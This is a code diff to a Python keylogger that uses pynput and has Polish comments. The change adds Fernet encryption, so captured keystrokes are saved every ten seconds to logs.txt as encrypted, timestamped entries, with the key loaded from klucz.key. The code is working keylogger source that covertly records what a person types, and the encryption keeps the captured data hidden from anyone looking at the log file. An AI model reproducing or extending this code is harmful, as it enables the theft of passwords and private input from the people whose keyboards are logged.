@@ -2,24 +2,47 @@ from pynput import keyboard
 from datetime import datetime
 import threading
 import time
+from cryptography.fernet import Fernet
 
 
 key_buffer = []
 lock = threading.Lock() # Blokada
 
 
-# zapisywanie klawiszy
+# Załadowanie klucza
+def zaladowanie_klucza():
+    with open("klucz.key", "rb") as file:
+        return file.read()
+    
+
+fernet = Fernet(zaladowanie_klucza())
+
+
+# Szyfrowanie
+def szyfrowanie(data: str) -> bytes:
+    return fernet.encrypt(data.encode())
+
+
+def odszyfrowanie(token: bytes) -> str:
+    return fernet.decrypt(token).decode()
+
+
+
+
+# Zapisywanie klawiszy
 def save_keys():
     while True:
         time.sleep(10)
         # blokada dla wątkow
         with lock:
             if key_buffer: # Jesli sa dane do zapisywania
-                with open("logs.txt", "a") as file:
                     timestamp = datetime.now().strftime("%d/%m/%Y:%H:%M:%S")
-                    file.write(f"{timestamp}: {key_buffer}\n")
-                    print(f"keybuffer ; {key_buffer}")
-                key_buffer.clear() # Czyszczenie buforu po zapisaniu
+                    data = f"{timestamp}: {key_buffer}"
+                    zaszyfrowane = szyfrowanie(data)
+                    with open("logs.txt", "ab") as file:
+                        file.write(zaszyfrowane + b"\n")
+                    print(f"Zapisano zaszyfgrowane: {zaszyfrowane}")
+                    key_buffer.clear() # Czyszczenie buforu po zapisaniu
 
 
 
